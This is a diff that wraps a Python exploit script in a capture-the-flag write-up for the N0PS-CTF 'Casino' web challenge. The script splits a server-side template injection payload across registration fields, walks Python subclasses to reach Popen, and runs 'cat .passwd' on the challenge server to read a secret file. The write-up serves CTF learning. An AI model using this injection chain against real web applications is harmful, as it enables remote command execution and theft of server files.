@@ -1,3 +1,16 @@
+---
+author: la1n
+title: "N0PS-CTF / Web / Casino Solution"
+description: "Python solution"
+pubDate: "Jul 10 2025"
+heroImage: "/writeups/la1n.jpg"
+---
+
+Official writeup - https://github.com/N0PSctf/N0PSctf-2025/blob/main/web/casino/writeup.md
+
+Exploit script:
+
+```python
 import random
 import html
 import string
@@ -10,11 +23,11 @@ random_str = ''.join(random.choices(string.ascii_letters + string.digits, k=leng
 
 url = 'https://nopsctf-casino.chals.io'
 
-# basic payload
+# 1. basic payload
 # username = 'lain'+random_str+'{{'
 # email = ' 7*7 }}lain@email.com'
 
-# finding index of popen
+# 2. finding index of popen
 #username = 'lain'+random_str+'{{'
 #email = " ''.__class__.__base__.__subclasses__() }}"
 #match = re.search(r'\[(.+)\]', x)
@@ -26,10 +39,12 @@ url = 'https://nopsctf-casino.chals.io'
 #        print(i)
 #        print(arr[i])
 
-# gettings flag
+# 3. final payload
 username = 'lain'+random_str+'{{'
+# file .passwd was discoverd with ls -al command
 email = " ''.__class__.__base__.__subclasses__()[528]('cat .passwd', shell=True, stdout=-1).communicate() }}"
 
+# main part
 data = {
     'username': username,
     'email': email,
@@ -52,3 +67,4 @@ csv = res.content.decode('utf-8')
 x = html.unescape(csv)
 
 print(x)
+```
